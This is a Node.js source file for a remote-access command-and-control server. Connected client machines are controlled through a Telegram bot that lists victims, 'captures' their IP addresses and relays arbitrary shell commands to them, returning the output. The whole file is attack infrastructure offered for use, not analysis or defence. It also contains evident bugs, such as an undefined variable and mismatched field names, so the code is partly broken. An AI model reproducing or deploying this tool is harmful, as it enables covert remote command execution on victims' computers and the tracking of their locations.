const net = require('net');
const crypto = require("crypto");
const TelegramBot = require("node-telegram-bot-api");
const readline = require('readline');

const server = net.createServer();
const bot = new TelegramBot("", { polling: true });
const clients = [];

server.on('connection', (client) => {
    let hash = crypto.createHash(
        "md5"
    ).update(
        client.remoteAddress
    ).digest("hex").slice(0, 16);
    clients.push({
        cli: cli,
        hash: hash
    });
    console.log('New client connected');

    client.on('data', async (data) => {
        console.log(`Received: ${data}`);
        let datax = JSON.parse(data);
        if (datax['status'] == "OK"){
            if (datax['method'] == "doj.getIp") {
                await bot.editMessageText(
                    `[ 📤 ] - IP has been Captured!\n\n[ 📃 ] - IP: <code>${datax['ip']}</code>`,
                    {
                        chat_id: datax['chat_id'],
                        message_id: datax['message_id'],
                        parse_mode: "HTML",
                    }
                )
            } else if (datax['method'] == "doj.executeCommand") {
                await bot.editMessageText(
                    `[ 🍷 ] - Command has been executed\n\n[ 📌 ] - Result: <code>${datax['output']}</code>`,
                    {
                        chat_id: datax['chat_id'],
                        message_id: datax['message_id'],
                        parse_mode: "HTML",
                    }
                )
            }
        } else {
            if (datax['method'] == "doj.getIp") {
                await bot.editMessageText(
                    `[ ❌ ] - Cannot Capture the IP!`,
                    {
                        chat_id: datax['chat_id'],
                        message_id: datax['message_id']
                    }
                )
            } else if (datax['method'] == "doj.executeCommand") {
                await bot.editMessageText(
                    `[ ❌ ] - Command Could not Execute`,
                    {
                        chat_id: datax['chat_id'],
                        message_id: datax['message_id']
                    }
                )
            }
        }
    });

    client.on('end', () => {
        console.log('Client disconnected');
        clients.splice(clients.indexOf(client), 1);
    });
});

server.listen(3000, () => {
    console.log('Server listening on port 3000');
});

bot.on("message", async (msg) => {
    if (msg.text == "/start"){
        let clis = [];
        for (let cl in clients){
            clis.push(`/panel_${cl.hash}`);
        }
        await bot.sendMessage(
            msg.chat.id,
            `[ 🔐 ] - Doj CLI ( Command Line Interface ) Remote\n[ 🕷 ] - Select a Panel to Open\n\n${JSON.stringify(clis, null, 2)}`,
            {
                reply_to_message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "close",
                                callback_data: `close_${msg.from.id}`
                            }
                        ]
                    ]
                }
            }
        )
    } else if (msg.text.startsWith("/panel_")){
        let spl = msg.text.split("_");
        let panelId = spl[1];
        for (let cli of clients){
            if (cli.hash == panelId){
                await bot.sendMessage(
                    msg.chat.id,
                    "[ 🛰 ] - Choose an Option",
                    {
                        reply_to_message_id: msg.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: "Get IP 🎃",
                                        callback_data: `getIp_${panelId}`
                                    },
                                    {
                                        text: "Execute Command 👤",
                                        callback_data: `ec`
                                    }
                                ]
                            ]
                        }
                    }
                )
                return;
            }
        }
    } else if (msg.text.startsWith("/exec")){
        if (msg.text.length > 5){
            let spl = msg.text.split(" ");
            let panelId = spl[1];
            let cmd = msg.text.slice(22, msg.text.length);
            for (let cli of clients){
                if (cli.hash == panelId){
                    await bot.sendMessage(
                        msg.chat.id,
                        "[ 🔰 ] - Client found, try to make connection ...",
                        {
                            reply_to_message_id: msg.message_id
                        }
                    ).then(async (rmsg) => {
                        cli.client.write(JSON.stringify({
                            method: `exec_${cmd}`,
                            chat_id: rmsg.chat.id,
                            message_id: rmsg.message_id.id
                        }))
                        return;
                    })
                }
            }
        }
    }
})

bot.on("callback_query", async (call) => {
    if (call.data.startsWith("close")){
        let spl = call.data.split("_");
        let uid = parseInt(spl[1]);
        if (uid == call.from.id){
            await bot.deleteMessage(call.message.chat.id, call.message.message_id)
        }
    } else if (call.data.startsWith("getIp_")){
        let spl = call.data.split("_");
        let pid = parseInt(spl[1]);
        for (let cli of clients){
            if (cli.hash == pid){
                cli.client.write(JSON.stringify({
                    method: "getIp",
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id
                }));
            }
        }
    } else if (call.data == "ec"){
        await bot.editMessageText("[ 📁 ] - For Execute, use this command: /exec <PANEL_ID> echo hi", {
            chat_id: call.message.chat.id,
            message_id: call.message.message_id
        })
    }
})

// Terminal input to send messages
// const rl = readline.createInterface({
//     input: process.stdin,
//     output: process.stdout
// });

// rl.on('line', (input) => {
//     clients.forEach(client => client.write(input));
//     console.log(input);
// });
